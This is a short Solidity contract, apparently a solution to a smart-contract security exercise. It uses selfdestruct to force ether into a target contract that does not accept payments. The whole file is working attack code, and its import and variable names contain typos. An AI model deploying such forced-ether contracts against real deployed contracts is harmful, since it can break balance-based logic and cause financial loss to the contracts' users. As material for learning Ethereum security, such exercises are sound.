// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Attacke.sol";

contract AttackForce {
    Attack public vulnerableContract;

    constructor(address _vulneraleContract) public {
        vulnerableContract = Attack(payable(_vulneraleContract));
    }

    function attack() public payable {
        require(msg.value > 0);
        address payable addr = payable(address(vulnerableContract));
        selfdestruct(addr);
    }
}
